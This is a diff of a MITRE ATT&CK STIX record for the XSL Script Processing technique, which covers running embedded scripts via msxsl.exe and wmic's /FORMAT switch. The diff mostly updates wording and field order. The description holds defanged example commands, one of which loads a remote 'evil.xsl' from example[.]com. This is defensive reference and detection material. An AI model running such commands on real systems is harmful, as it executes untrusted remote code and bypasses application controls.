@@ -1,13 +1,13 @@
 {
     "type": "bundle",
-    "id": "bundle--c3ff5559-5373-46ac-a843-d2e790edeed9",
+    "id": "bundle--cd545eba-c434-4ce0-be77-6707e0ddcbc6",
     "spec_version": "2.0",
     "objects": [
         {
             "id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
             "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
             "name": "XSL Script Processing",
-            "description": "Adversaries may bypass application whitelisting and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>",
+            "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>",
             "external_references": [
                 {
                     "source_name": "mitre-attack",
@@ -60,13 +60,23 @@
                     "kill_chain_name": "mitre-attack"
                 }
             ],
-            "modified": "2020-02-05T14:15:23.103Z",
+            "modified": "2020-06-20T22:45:46.479Z",
             "created": "2018-10-17T00:14:20.652Z",
-            "x_mitre_version": "1.2",
-            "x_mitre_contributors": [
-                "Avneet Singh",
-                "Casey Smith",
-                "Praetorian"
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_system_requirements": [
+                "Microsoft Core XML Services (MSXML) or access to wmic.exe"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
+            "x_mitre_defense_bypassed": [
+                "Anti-virus",
+                "Application control",
+                "Digital Certificate Validation"
             ],
             "x_mitre_data_sources": [
                 "Process monitoring",
@@ -74,22 +84,12 @@
                 "Process use of network",
                 "DLL monitoring"
             ],
-            "x_mitre_defense_bypassed": [
-                "Anti-virus",
-                "Application whitelisting",
-                "Digital Certificate Validation"
+            "x_mitre_contributors": [
+                "Avneet Singh",
+                "Casey Smith",
+                "Praetorian"
             ],
-            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
-            "x_mitre_permissions_required": [
-                "User"
-            ],
-            "x_mitre_platforms": [
-                "Windows"
-            ],
-            "x_mitre_system_requirements": [
-                "Microsoft Core XML Services (MSXML) or access to wmic.exe"
-            ],
-            "x_mitre_is_subtechnique": false
+            "x_mitre_version": "1.2"
         }
     ]
 }
